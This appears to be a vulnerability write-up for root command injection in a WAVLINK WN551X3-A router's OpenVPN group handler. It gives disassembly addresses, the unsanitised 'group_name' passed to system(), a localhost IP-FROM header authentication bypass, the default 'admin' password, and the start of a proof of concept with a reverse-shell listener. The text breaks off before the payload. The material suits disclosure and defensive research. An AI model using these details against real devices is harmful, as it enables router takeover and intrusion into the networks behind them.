# WAVLINK WN551X3-A — Unauthenticated (default-config) OS Command Injection → Root RCE in `ioos` (`openvpn_cli_group`)
...
| Sink | `system()` @ `0x41659c` — `uci set ovpnclient.@groups[-1].group_name='<user>'` |
| Exploitation precondition | (a) loopback/SSRF reachability of `ioos:81` (**verified**, `uid=0`), **or** (b) a valid session token — default web password is `admin` (`option Password admin`); note: the first_login empty-password path (true on sibling WN536AX6) was **NOT reproducible** on this firmware's login endpoint in the emulator (returns 10001/10002) |

## Overview

The WN551X3-A web stack is a classic "front-end + back-end" architecture:
...
```
snprintf(buf, "..", "uci set ovpnclient.@groups[-1].group_name='%s'", group_name);   // 0x416584
system(buf);                                                                         // 0x41659c
```
...
Authentication. The dispatcher (`cgi_protocol_handler`) sets the per-connection login flag (`con->login` @ `+0x64`) whenever the `IP-FROM` request header equals `127.0.0.1` — a "localhost trust" check that bypasses token validation entirely (vector **a**, **verified**). Going through the `lighttpd` front door, `IP-FROM` is overwritten with the real client IP, so token validation applies. The default web password is `admin` (`option Password admin` in `/etc/config/winstar`); on this firmware the login endpoint `fname=system&opt=login&function=set` did NOT accept an empty password in the emulator (returns 10001 for `usrid=sha256(admin)`, 10002 for empty `usrid`), so vector **b** (fully-remote unauthenticated via first_login) — confirmed on the sibling WN536AX6 — was **not reproduced** here. Vector **a** (loopback `IP-FROM` trust) is the verified exploitation path on this firmware.
...
```
sub_41612c (openvpn_cli_group handler, auth-gated by ldr w20,[x19,#0x64];cmp #1 @ 0x416190):
  0x416840  get_param(con, "group_name")          ; x25 = attacker-controlled group_name
  ...
  0x416584  snprintf(buf, 0x4000,
                     "uci set ovpnclient.@groups[-1].group_name='%s'", group_name)
  0x41659c  system(buf)                            ; root-owned shell, single-quote context
  0x4165a4  system("uci commit ovpnclient")
```
...
**Sibling (same pattern).** `opt=wireguard_cli_group` (`sub_4195b4`) builds the analogous `uci set wgclient.@groups[-1].group_name='%s'` (`snprintf` @ `0x419a54`, `system` @ `0x419a68`) and is exploitable identically.

## Proof of Concept

Start a listener on the attacker host (e.g. `192.168.1.5`): `ncat -lvnp 4444`.

**Vector b — through the lighttpd front door (NOT reproduced on this firmware: login endpoint returns 10001/10002 in the emulator; shown as reference from sibling WN536AX6, default pwd is `admin`):**
